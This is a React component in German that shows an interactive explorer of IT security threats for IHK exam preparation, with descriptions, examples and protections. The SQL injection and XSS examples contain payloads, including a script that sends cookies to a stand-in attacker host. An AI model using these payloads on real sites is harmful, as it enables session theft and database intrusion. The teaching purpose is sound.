"use client";

import { useState } from "react";

// ============================================================================
// Security Threat Explorer — Bedrohungen visualisieren & verstehen
// ============================================================================

interface Threat {
  id: string;
  name: string;
  icon: string;
  category: "netzwerk" | "software" | "social" | "hardware";
  severity: "niedrig" | "mittel" | "hoch" | "kritisch";
  description: string;
  example: string;
  protection: string;
  ihkRelevance: string;
}

const threats: Threat[] = [
  {
    id: "malware",
    name: "Malware",
    icon: "🦠",
    category: "software",
    severity: "kritisch",
    description: "Bösartige Software, die Schäden verursacht, Daten stiehlt oder Systeme kontrolliert. Umfasst Viren, Würmer, Trojaner, Ransomware und Spyware.",
    example: "Ein Trojaner tarnt sich als nützliches Tool und installiert im Hintergrund einen Keylogger, der alle Tastatureingaben aufzeichnet.",
    protection: "Antivirus-Software, regelmäßige Updates, keine unbekannten Downloads, E-Mail-Anhänge prüfen",
    ihkRelevance: "IHK AP1: Malware-Typen unterscheiden können (Virus vs. Wurm vs. Trojaner)",
  },
  {
    id: "ddos",
    name: "DDoS",
    icon: "🌊",
    category: "netzwerk",
    severity: "hoch",
    description: "Distributed Denial of Service — Viele Rechner senden gleichzeitig so viele Anfragen an einen Server, dass dieser überlastet und nicht mehr reagiert.",
    example: "Ein Botnetz mit 10.000 infizierten Rechnern flutet einen Webserver mit Millionen HTTP-Anfragen pro Sekunde.",
    protection: "DDoS-Schutzdienste (Cloudflare), Rate Limiting, CDN, redundante Server",
    ihkRelevance: "IHK AP2: Verfügbarkeit (Availability) als Sicherheitsziel verstehen",
  },
  {
    id: "mitm",
    name: "Man-in-the-Middle",
    icon: "🕵️",
    category: "netzwerk",
    severity: "kritisch",
    description: "Ein Angreifer positioniert sich heimlich zwischen zwei Kommunikationspartnern und kann alle Daten mitlesen oder verändern, ohne dass die Parteien es bemerken.",
    example: "In einem öffentlichen WLAN setzt ein Angreifer ARP-Spoof ein, um sich als Gateway auszugeben und allen Datenverkehr mitzulesen.",
    protection: "TLS/HTTPS, VPN, Zertifikate prüfen, öffentliche WLANs vermeiden",
    ihkRelevance: "IHK AP2: Verschlüsselung und TLS-Handshake erklären können",
  },
  {
    id: "phishing",
    name: "Phishing",
    icon: "🎣",
    category: "social",
    severity: "hoch",
    description: "Social-Engineering-Angriff über gefälschte E-Mails oder Websites, der Nutzer zur Preisgabe von Zugangsdaten oder persönlichen Informationen verleitet.",
    example: "Eine E-Mail angeblich von der Bank: 'Ihr Konto wurde gesperrt! Klicken Sie hier, um es zu reaktivieren.' Der Link führt zu einer gefälschten Seite.",
    protection: "Absender prüfen, Links nicht blind klicken, 2FA aktivieren, Schulungen",
    ihkRelevance: "IHK AP1: Social Engineering als Angriffsvektor erklären",
  },
  {
    id: "sql-injection",
    name: "SQL Injection",
    icon: "💉",
    category: "software",
    severity: "kritisch",
    description: "Ein Angreifer gibt SQL-Befehle in Eingabefelder ein, um die Datenbank dahinter zu manipulieren — Daten lesen, ändern oder löschen.",
    example: "Login-Feld: Benutzername = ' OR 1=1 -- → Die Datenbank gibt alle Datensätze zurück, weil die WHERE-Bedingung immer wahr ist.",
    protection: "Prepared Statements, Input Validation, ORM verwenden, WAF",
    ihkRelevance: "IHK AP2: OWASP Top 10 — häufigster Web-Angriff!",
  },
  {
    id: "xss",
    name: "Cross-Site Scripting (XSS)",
    icon: "📜",
    category: "software",
    severity: "hoch",
    description: "Ein Angreifer schleust bösartigen JavaScript-Code in eine Webseite ein, der im Browser anderer Nutzer ausgeführt wird.",
    example: "In einem Kommentarfeld wird <script>document.location='http://angrifer.de/cookie='+document.cookie</script> eingefügt.",
    protection: "Input Escaping, Content Security Policy (CSP), HTTPOnly-Cookies",
    ihkRelevance: "IHK AP2: OWASP Top 10 — XSS-Typen kennen (Stored, Reflected, DOM-based)",
  },
  {
    id: "ransomware",
    name: "Ransomware",
    icon: "🔒",
    category: "software",
    severity: "kritisch",
    description: "Verschlüsselt alle Dateien auf dem System und fordert Lösegeld (meist in Kryptowährung) für den Entschlüsselungs-Schlüssel.",
    example: "WannaCry (2017) verschlüsselte weltweit über 200.000 Computer in Krankenhäusern, Behörden und Unternehmen.",
    protection: "Regelmäßige Backups (3-2-1-Regel), Updates, E-Mail-Filter, Schulungen",
    ihkRelevance: "IHK AP1: Backup-Strategien und Disaster Recovery",
  },
  {
    id: "brute-force",
    name: "Brute-Force",
    icon: "🔨",
    category: "software",
    severity: "mittel",
    description: "Systematisches Ausprobieren aller möglichen Passwort-Kombinationen bis das richtige gefunden ist. Variante: Dictionary-Angriff mit häufigen Passwörtern.",
    example: "Ein Programm testet 100.000 Passwörter pro Sekunde gegen einen SSH-Server.",
    protection: "Starke Passwörter, Account-Lockout, Rate Limiting, 2FA, Captcha",
    ihkRelevance: "IHK AP1: Passwortsicherheit und Authentifizierung",
  },
  {
    id: "rootkit",
    name: "Rootkit",
    icon: "👻",
    category: "software",
    severity: "kritisch",
    description: "Software, die sich tief im Betriebssystem (Kernel-Ebene) versteckt und anderen Malware Schutz bietet, indem sie ihre Existenz vor dem Nutzer und Antivirus-Programmen verbirgt.",
    example: "Ein Rootkit modifiziert den Kernel, sodass 'ps' und 'top' keine verdächtigen Prozesse mehr anzeigen.",
    protection: "Secure Boot, Trusted Platform Module (TPM), regelmäßige Rootkit-Scans",
    ihkRelevance: "IHK AP2: Systemhärtung und Sicherheitsarchitektur",
  },
  {
    id: "zero-day",
    name: "Zero-Day-Exploit",
    icon: "⚡",
    category: "software",
    severity: "kritisch",
    description: "Ein Angriff, der eine noch unbekannte Schwachstelle ausnutzt — bevor der Hersteller ein Update veröffentlichen kann. Sehr gefährlich, da keine Abwehr existiert.",
    example: "Log4Shell (2021): Eine Schwachstelle in der Java-Bibliothek Log4j ermöglichte Remote Code Execution auf Millionen Servern.",
    protection: "Defense-in-Depth, Intrusion Detection, Virtual Patching,_least Privilege",
    ihkRelevance: "IHK AP2: Schwachstellenmanagement und Patch-Management",
  },
];

const categoryColors: Record<string, string> = {
  netzwerk: "from-blue-500 to-cyan-500",
  software: "from-purple-500 to-pink-500",
  social: "from-orange-500 to-yellow-500",
  hardware: "from-green-500 to-emerald-500",
};

const severityColors: Record<string, string> = {
  niedrig: "bg-green-600",
  mittel: "bg-yellow-600",
  hoch: "bg-orange-600",
  kritisch: "bg-red-600",
};

export function SecurityThreatExplorer() {
  const [selectedThreat, setSelectedThreat] = useState<Threat | null>(null);
  const [filterCategory, setFilterCategory] = useState<string>("all");

  const filtered = filterCategory === "all"
    ? threats
    : threats.filter((t) => t.category === filterCategory);

  return (
    <div className="bg-slate-800 rounded-xl p-4 sm:p-6 border border-slate-700">
      <h3 className="text-xl font-bold text-white mb-2">🎯 Sicherheitsbedrohungen — Explorer</h3>
      <p className="text-slate-300 text-sm mb-4">
        Klicke auf eine Bedrohung, um Details, Schutzmaßnahmen und IHK-Relevanz zu erfahren.
      </p>

      {/* Filter */}
      <div className="flex flex-wrap gap-2 mb-4">
        {[
          { key: "all", label: "Alle", icon: "🌐" },
          { key: "netzwerk", label: "Netzwerk", icon: "🌍" },
          { key: "software", label: "Software", icon: "💻" },
          { key: "social", label: "Social Engineering", icon: "🧠" },
        ].map((cat) => (
          <button
            key={cat.key}
            onClick={() => { setFilterCategory(cat.key); setSelectedThreat(null); }}
            className={`px-3 py-1.5 rounded-lg text-xs font-medium transition-all ${
              filterCategory === cat.key
                ? "bg-red-500 text-white shadow-md"
                : "bg-slate-700 text-slate-300 hover:bg-slate-600"
            }`}
          >
            {cat.icon} {cat.label}
          </button>
        ))}
      </div>

      {/* Threat Grid */}
      <div className="grid grid-cols-2 sm:grid-cols-3 lg:grid-cols-5 gap-2 mb-4">
        {filtered.map((threat) => (
          <button
            key={threat.id}
            onClick={() => setSelectedThreat(selectedThreat?.id === threat.id ? null : threat)}
            className={`p-3 rounded-xl border-2 transition-all text-left ${
              selectedThreat?.id === threat.id
                ? "border-red-400 bg-slate-700 shadow-lg scale-[1.02]"
                : "border-slate-600 bg-slate-900 hover:border-slate-500 hover:bg-slate-800"
            }`}
          >
            <div className="text-2xl mb-1">{threat.icon}</div>
            <div className="text-white text-xs font-semibold leading-tight">{threat.name}</div>
            <span className={`inline-block mt-1 px-1.5 py-0.5 rounded text-[10px] font-bold text-white ${severityColors[threat.severity]}`}>
              {threat.severity.toUpperCase()}
            </span>
          </button>
        ))}
      </div>

      {/* Detail View */}
      {selectedThreat && (
        <div className="bg-slate-900 rounded-xl p-4 border border-slate-600">
          <div className="flex items-start gap-3 mb-3">
            <div className={`w-12 h-12 rounded-xl bg-gradient-to-br ${categoryColors[selectedThreat.category]} flex items-center justify-center text-2xl shrink-0`}>
              {selectedThreat.icon}
            </div>
            <div>
              <h4 className="text-white font-bold text-lg">{selectedThreat.name}</h4>
              <div className="flex gap-2 mt-1">
                <span className={`px-2 py-0.5 rounded text-xs font-bold text-white ${severityColors[selectedThreat.severity]}`}>
                  {selectedThreat.severity.toUpperCase()}
                </span>
                <span className="px-2 py-0.5 rounded text-xs bg-slate-700 text-slate-300">
                  {selectedThreat.category}
                </span>
              </div>
            </div>
          </div>

          <div className="space-y-3">
            <div>
              <h5 className="text-slate-400 text-xs font-semibold mb-1">📋 Beschreibung</h5>
              <p className="text-slate-200 text-sm">{selectedThreat.description}</p>
            </div>

            <div className="bg-slate-800 rounded-lg p-3">
              <h5 className="text-yellow-400 text-xs font-semibold mb-1">⚠️ Beispiel</h5>
              <p className="text-slate-300 text-sm">{selectedThreat.example}</p>
            </div>

            <div className="bg-green-900/20 rounded-lg p-3 border border-green-800/30">
              <h5 className="text-green-400 text-xs font-semibold mb-1">🛡️ Schutzmaßnahmen</h5>
              <p className="text-slate-300 text-sm">{selectedThreat.protection}</p>
            </div>

            <div className="bg-blue-900/20 rounded-lg p-3 border border-blue-800/30">
              <h5 className="text-blue-400 text-xs font-semibold mb-1">📝 IHK-Relevanz</h5>
              <p className="text-slate-300 text-sm">{selectedThreat.ihkRelevance}</p>
            </div>
          </div>
        </div>
      )}

      {/* Merksatz */}
      <div className="mt-4 bg-red-900/20 border border-red-800/30 rounded-lg p-3">
        <p className="text-red-300 text-sm">
          💡 <strong>Merke:</strong> IT-Sicherheit basiert auf der <strong>CIA-Triade</strong>: Confidentiality (Vertraulichkeit), Integrity (Integrität), Availability (Verfügbarkeit). Jede Bedrohung verletzt mindestens eines dieser Ziele!
        </p>
      </div>
    </div>
  );
}
